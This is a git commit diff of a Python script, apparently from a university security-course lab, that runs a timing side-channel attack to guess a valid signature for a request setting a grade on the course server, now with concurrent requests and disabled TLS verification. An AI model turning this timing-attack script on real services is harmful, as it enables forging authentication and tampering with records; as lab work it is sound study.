c7d98220489ec9caef3061214befe218122abbf3
schurmann <jonathan.schurmann@gmail.com>
2017-12-12 12:55:06 +0100

    - Added multithreading for requests - Write executing time to file

--- HA4/b2.py
+++ HA4/b2.py
@@ -1,22 +1,27 @@
 import requests as r
 from numpy import argmax
 import time
+import urllib3
+from requests_futures.sessions import FuturesSession
 
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 chars = 'abcdef1234567890'
+url = "https://eitn41.eit.lth.se:3119/ha4/addgrade.php"
 
 def rtt(sig:str, samples=1) -> float:
-    url = "https://eitn41.eit.lth.se:3119/ha4/addgrade.php"
+    session = FuturesSession()
     times = []
     ans = "---"
-    for i in range(samples):
-        time.sleep(0.2)
-        res = r.get(url, params={
+    full_urls = [r.Request('GET', url, params={
             "name" : "Kalle",
             "grade" : 5,
             "signature" : sig
-            }, verify=False)
-        times.append(res.elapsed.total_seconds())
-        ans = res.text.strip()
+            }).prepare().url] * samples
+    future_resps = [session.get(u, verify=False) for u in full_urls]
+    resps = [resp.result() for resp in future_resps]
+    times = [res.elapsed.total_seconds() for res in resps]
+    ans = resps[0].text.strip()
     avgtime = sum(times)/samples
     print("sig:", sig, "time:", avgtime)
     return (avgtime, False if ans == '0' else True)
@@ -26,12 +31,23 @@ if __name__ == '__main__':
     # time: 0.6456826666666667
     prev = ''
     found = False
-    while (not found):
-        resps = [ rtt(prev + c, samples=3) for c in chars ]
+    data_file = 'b2_times'
+    data = []
+    try:
+        with open(data_file, 'r') as f:
+            data = [line for line in f]
+            prev = data[-1].split(":")[-1]
+    except FileNotFoundError:
+        print('previous data file not found')
+    i = len(prev)
+    while not found:
+        resps = [ rtt(prev + c, samples=10) for c in chars ]
         unzipped = list(zip(*resps))
         times, status = unzipped[0], unzipped[1]
         found = True in status
         prev += chars[argmax(times)]
-        print(max(times))
-        print(prev)
-
+        data.append(f'{i}:{max(times):{prev}}\n')
+        i += 1
+        print(f'sig: {prev}')
+        with open(data_file, 'w') as f:
+            [f.write(line) for line in data]
